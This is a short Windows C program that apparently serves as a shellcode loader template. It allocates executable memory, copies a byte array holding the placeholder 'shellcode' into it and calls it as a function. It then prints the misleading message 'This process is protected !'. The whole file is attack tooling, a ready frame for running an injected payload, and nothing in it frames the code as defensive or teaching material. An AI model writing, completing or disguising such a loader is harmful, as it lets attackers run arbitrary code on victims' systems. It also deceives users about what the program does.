#include <windows.h>
#include <stdio.h>
 
unsigned char Shellcode[] = "shellcode";
 
 
 
int main(int argc, char const *argv[])
{
    char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(BUFFER, Shellcode, sizeof(Shellcode));
    (*(void(*)())BUFFER)(); 
 
    printf("This process is protected !");
    getchar();
 
    return 0;
}
